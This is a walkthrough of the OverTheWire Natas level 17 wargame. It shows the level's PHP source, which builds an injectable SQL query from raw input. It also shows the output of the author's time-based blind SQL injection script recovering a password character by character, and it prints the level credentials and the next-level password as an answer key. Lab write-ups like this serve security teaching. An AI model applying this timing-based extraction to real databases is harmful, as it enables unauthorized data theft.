# Natas17 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL:      http://natas17.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Now we are working with time based SQLI.

  ```
  <body>
  <h1>natas17</h1>
  <div id="content">
  <?php
  
  /*
  CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
  );
  */
  
  if(array_key_exists("username", $_REQUEST)) {
      $link = mysqli_connect('localhost', 'natas17', '<censored>');
      mysqli_select_db($link, 'natas17');
  
      $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
      if(array_key_exists("debug", $_GET)) {
          echo "Executing query: $query<br>";
      }
  
      $res = mysqli_query($link, $query);
      if($res) {
      if(mysqli_num_rows($res) > 0) {
          //echo "This user exists.<br>";
      } else {
          //echo "This user doesn't exist.<br>";
      }
      } else {
          //echo "Error in query.<br>";
      }
  
      mysqli_close($link);
  } else {
  ?>
  
  <form action="index.php" method="POST">
  Username: <input name="username"><br>
  <input type="submit" value="Check existence" />
  </form>
  <?php } ?>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- As indicated in the source code, we won't be able to see the response from the server.

  ```
    $res = mysqli_query($link, $query);
      if($res) {
      if(mysqli_num_rows($res) > 0) {
          //echo "This user exists.<br>";
      } else {
          //echo "This user doesn't exist.<br>";
      }
      } else {
          //echo "Error in query.<br>";
      }
  ```

- Again, I wrote a script since automation is the key. PRACTICE YOUR SCRIPTING!!!!

  ```
  $ python3 sqli-timebased.py
  [SNIP!]
  Found password so far: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG
  [30/32] Trying: a -> 0.10s
  [30/32] Trying: b -> 0.11s
  [30/32] Trying: c -> 0.10s
  [30/32] Trying: d -> 0.11s
  [30/32] Trying: e -> 0.11s
  [30/32] Trying: f -> 0.11s
  [30/32] Trying: g -> 2.11s
  Found password so far: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg
  [31/32] Trying: a -> 0.10s
  [31/32] Trying: b -> 0.11s
  [31/32] Trying: c -> 0.11s
  [31/32] Trying: d -> 0.11s
  [31/32] Trying: e -> 0.11s
  [31/32] Trying: f -> 0.11s
  [31/32] Trying: g -> 0.10s
  [31/32] Trying: h -> 0.11s
  [31/32] Trying: i -> 0.10s
  [31/32] Trying: j -> 0.11s
  [31/32] Trying: k -> 0.11s
  [31/32] Trying: l -> 0.12s
  [31/32] Trying: m -> 0.10s
  [31/32] Trying: n -> 0.11s
  [31/32] Trying: o -> 0.11s
  [31/32] Trying: p -> 0.10s
  [31/32] Trying: q -> 0.11s
  [31/32] Trying: r -> 0.11s
  [31/32] Trying: s -> 0.11s
  [31/32] Trying: t -> 0.10s
  [31/32] Trying: u -> 0.12s
  [31/32] Trying: v -> 0.10s
  [31/32] Trying: w -> 0.11s
  [31/32] Trying: x -> 0.11s
  [31/32] Trying: y -> 0.10s
  [31/32] Trying: z -> 0.11s
  [31/32] Trying: A -> 0.11s
  [31/32] Trying: B -> 0.11s
  [31/32] Trying: C -> 2.11s
  Found password so far: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC
  [32/32] Trying: a -> 0.11s
  [32/32] Trying: b -> 0.10s
  [32/32] Trying: c -> 0.11s
  [32/32] Trying: d -> 0.11s
  [32/32] Trying: e -> 0.10s
  [32/32] Trying: f -> 0.10s
  [32/32] Trying: g -> 0.10s
  [32/32] Trying: h -> 0.11s
  [32/32] Trying: i -> 0.10s
  [32/32] Trying: j -> 0.11s
  [32/32] Trying: k -> 0.11s
  [32/32] Trying: l -> 0.11s
  [32/32] Trying: m -> 0.11s
  [32/32] Trying: n -> 0.11s
  [32/32] Trying: o -> 0.11s
  [32/32] Trying: p -> 0.11s
  [32/32] Trying: q -> 0.11s
  [32/32] Trying: r -> 0.11s
  [32/32] Trying: s -> 0.10s
  [32/32] Trying: t -> 0.11s
  [32/32] Trying: u -> 0.11s
  [32/32] Trying: v -> 0.11s
  [32/32] Trying: w -> 0.11s
  [32/32] Trying: x -> 0.11s
  [32/32] Trying: y -> 0.11s
  [32/32] Trying: z -> 0.12s
  [32/32] Trying: A -> 0.11s
  [32/32] Trying: B -> 0.11s
  [32/32] Trying: C -> 0.11s
  [32/32] Trying: D -> 0.11s
  [32/32] Trying: E -> 0.11s
  [32/32] Trying: F -> 0.11s
  [32/32] Trying: G -> 0.10s
  [32/32] Trying: H -> 0.10s
  [32/32] Trying: I -> 0.11s
  [32/32] Trying: J -> 2.11s
  
  Found password so far: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
  
  Found full password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
  ```

---

## 🏁 Password for the next level

`Password for natas18 is: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
